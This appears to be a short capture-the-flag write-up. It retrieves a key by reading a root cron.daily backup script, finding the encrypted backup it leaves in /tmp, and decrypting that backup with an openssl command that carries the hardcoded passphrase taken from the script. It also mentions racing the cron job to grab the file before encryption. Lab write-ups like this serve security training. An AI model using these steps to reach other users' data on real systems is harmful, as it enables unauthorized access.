**GOAL**: TO retrieve the key from the `script` that is ran by the `root` user on a daily basis using cron(/etc/cron)

## Solution
1. Logging into the instace, we lookout for `cron` tasks that are carried out on the system
2. We can do this by going to `/etc/cron.daily` directory
3. Here, we can find a `backup` file and looking at the contents of this file, we can conclude that the user had created, and encoded a `backup` file and removed it too. All this was done in the `tmp` folder
4. Visiting the `/tmp` folder, we can see a `backup.tgz.enc` which is basically a cron task carried out which is specified by the `root`
5. This task will continue in loop all the time, staring from getting the backup file, then encryption it, and then removing it.
6. If we're present in the system at the correct time, then we can retrieve the file before the 2nd step(i.e encrypting the file) takes place and  we can retrieve the file without needing to decrypt it.
7. But we are not sure when will it happen so we using the second approach i.e. decrypting the file
6. We can decrypt the file using the following command: ```openssl enc -d -aes256 -k P3NT35T3RL48 -in backup.tgz.enc -out foo.tgz```
7. And we can obtain the key, by visiting the `/home/victim/sec`
